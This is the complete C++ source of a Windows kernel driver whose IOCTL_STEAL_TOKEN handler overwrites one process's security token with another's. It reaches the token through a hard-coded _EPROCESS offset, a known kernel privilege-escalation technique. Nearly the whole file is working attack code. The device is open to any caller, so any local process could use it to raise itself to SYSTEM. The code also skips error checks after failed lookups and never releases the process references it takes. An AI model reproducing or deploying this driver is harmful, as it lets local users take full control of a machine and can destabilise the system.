#include <ntifs.h>
#include <ntddk.h>
#include <Wdm.h>

#define CUSTOM_DEVICE 0x8000
#define IOCTL_PRIORITY_DATA_ONE CTL_CODE(CUSTOM_DEVICE, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_PRIORITY_DATA_TWO CTL_CODE(CUSTOM_DEVICE, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_STEAL_TOKEN CTL_CODE(CUSTOM_DEVICE, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)

#define TOKEN_OFFSET 0x4b8

// Custom struct for passing data from usermode to kernelmode.
struct PIDData {
	ULONG ulTargetPID; // PID to change the token of.
	ULONG ulSrcPID;    // PID to steal the token of.
};

// Function for printing debug output.
void DebugInfo(char* str) {
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "%s", str);
}

// Forward declarations.
void UnloadDriver(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS MajCreate(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS MajClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS HandleDeviceIoControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

// Tag for tagged memory pool. == 'abcd', since little-endian.
#define DRIVER_TAG 'dcba'

extern "C" // C linkage is needed for drivers.
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) // Main driver entry point.
{
	// Ignore unused parameter.
	UNREFERENCED_PARAMETER(RegistryPath);

	DebugInfo("[+] DriverEntry called\n");
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Registry path: %ws\n", RegistryPath->Buffer);

	// Set the UnloadDriver function to be called when the driver is unloaded.
	DriverObject->DriverUnload = UnloadDriver;
	DebugInfo("[+] DriverObject->DriverUnload set to UnloadDriver()\n");

	// Create the device object with IoCreateDevice().
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\TestingService");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(
		DriverObject,		 // our driver object,
		0,					 // no need for extra bytes,
		&devName,			 // the device name,
		FILE_DEVICE_UNKNOWN, // device type,
		0,					 // characteristics flags,
		FALSE,				 // not exclusive,
		&DeviceObject		 // the resulting pointer
	);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[!] Failed to create device object (0x%08X)\n", status);
		return status;
	}
	else {
		DebugInfo("[i] Device object created\n");
	}

	// Create the symbolic link.
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TestingService");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[!] Failed to create symbolic link (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		return status;
	}

	// Set the callbacks for create and close IRPs.
	DriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)MajCreate;
	DebugInfo("[+] DriverObject->MajorFunction[IRP_MJ_CREATE] set to MajCreate()\n");
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)MajClose;
	DebugInfo("[+] DriverObject->MajorFunction[IRP_MJ_CLOSE] set to MajClose()\n");
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)HandleDeviceIoControl;
	DebugInfo("[+] DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] set to DeviceIoControl()\n");

	return STATUS_SUCCESS;
}

void UnloadDriver(_In_ PDRIVER_OBJECT DriverObject) // Driver unload function.
{
	DebugInfo("[+] UnloadDriver called\n");

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TestingService");
	IoDeleteSymbolicLink(&symLink);
	DebugInfo("[!] Symbolic link deleted\n");

	// Delete the device driver object.
	IoDeleteDevice(DriverObject->DeviceObject);
	DebugInfo("[!] Device object deleted\n");

	DebugInfo("[+] Driver unloaded\n");
}

NTSTATUS MajCreate(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	DebugInfo("[+] MajCreate called\n");
	return STATUS_SUCCESS;
}

NTSTATUS MajClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	// Ack the IRP, set the response status to success, and complete the request.
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	DebugInfo("[+] MajClose called\n");
	return STATUS_SUCCESS;
}

NTSTATUS HandleDeviceIoControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	DebugInfo("[+] HandleDeviceIoControl called\n");

	// Get the stack location from the IRP.
	IO_STACK_LOCATION* stack = IoGetCurrentIrpStackLocation(Irp);
	// Get the IOCTL from the stack.
	ULONG IOCTL = stack->Parameters.DeviceIoControl.IoControlCode;

	PIDData* data = nullptr;
	ULONG ulDstPID = 0;
	PEPROCESS pTargetEPROCESS = nullptr;
	PEPROCESS pSrcEPROCESS = nullptr;
	NTSTATUS status;
	void* pTargetToken = nullptr;
	void* pSrcToken = nullptr;

	__try {
		switch (IOCTL)
		{
		case IOCTL_STEAL_TOKEN:
			DebugInfo("--------------------------------------------------------------------------------\n");
			DebugInfo("[i] IOCTL_STEAL_TOKEN hit\n");

			// Save the input buffer and cast as custom data struct.
			data = (PIDData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
			if (data == nullptr) { break; }

			// Save the target PID.
			ulDstPID = data->ulTargetPID;
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Target PID - %d\n", ulDstPID);
			__try
			{
				// Convert the PID to the address of the _EPROCESS structure.
				status = PsLookupProcessByProcessId(ULongToHandle(ulDstPID), &pTargetEPROCESS);
				if (!NT_SUCCESS(status)) {
					DebugInfo("[x] Target PID PsLookupProcessByProcessId failed\n");
				}
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] _EPROCESS address of PID - 0x%p\n", pTargetEPROCESS);
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				DebugInfo("[x] Target PID PsLookupProcessByProcessId failed\n");
				break;
			}

			// Get the address that points to the Token member structure by casting the address of the _EPROCESS structure
			// to UINT64 and adding the offset of 0x4b8, which on this version of Windows 10 points to the Token
			// structure, then casting it to a void pointer for printing.
			// The Token member points to a _EX_FAST_REF structure.
			pTargetToken = (void*)(UINT64(pTargetEPROCESS) + (UINT64)TOKEN_OFFSET);
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Token structure (EPROCESS + offset) - 0x%p\n", pTargetToken);

			DebugInfo("--------------------------------------------------------------------------------\n");

			// Save the source PID.
			ulDstPID = data->ulSrcPID;
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Source PID - %d\n", ulDstPID);
			__try
			{
				// Convert the PID to the address of the _EPROCESS structure.
				status = PsLookupProcessByProcessId(ULongToHandle(ulDstPID), &pSrcEPROCESS);
				if (!NT_SUCCESS(status)) {
					DebugInfo("[x] Source PID PsLookupProcessByProcessId failed\n");
				}
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] _EPROCESS address of PID - 0x%p\n", pSrcEPROCESS);
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				DebugInfo("[x] Source PID PsLookupProcessByProcessId failed\n");
				break;
			}

			// Get the address that points to the Token member structure by casting the address of the _EPROCESS structure
			// to UINT64 and adding the offset of 0x4b8, which on this version of Windows 10 points to the Token
			// structure, then casting it to a void pointer for printing. The Token member points to a _EX_FAST_REF structure.
			pSrcToken = (void*)(UINT64(pSrcEPROCESS) + (UINT64)TOKEN_OFFSET);
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Token structure (EPROCESS + offset) - 0x%p\n", pSrcToken);

			DebugInfo("--------------------------------------------------------------------------------\n");
			
			// Copy the value of the source token to the address of the target token. This is done by casting the addresses as
			// unsigned ints, doing pointer arithmetic to add the offset, and dereferencing the result.
			__try
			{
				DebugInfo("[+] Setting target token to the source token\n");
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Target token value before copy - 0x%llX\n", *(UINT64*)pTargetToken);
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Source token value before copy - 0x%llX\n", *(UINT64*)pSrcToken);

				*(UINT64*)((UINT64)pTargetEPROCESS + (UINT64)TOKEN_OFFSET) = *(UINT64*)(UINT64(pSrcEPROCESS) + (UINT64)TOKEN_OFFSET);
				DebugInfo("[+] Source token copied to the target!\n");

				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Target token value after copy - 0x%llX\n", *(UINT64*)pTargetToken);
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[i] Source token value after copy - 0x%llX\n", *(UINT64*)pSrcToken);
			}
			__except (EXCEPTION_EXECUTE_HANDLER)
			{
				DebugInfo("[x] Setting target token to source token failed!\n");
			}

			DebugInfo("--------------------------------------------------------------------------------\n");
			break;
		default:
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[!] Received unknown IOCTL - 0x%X\n", IOCTL);
			break;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		DebugInfo("[x] Exception in switch statement\n");
	}

	// Ack the IRP, set the response status to success, and complete the request.
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}
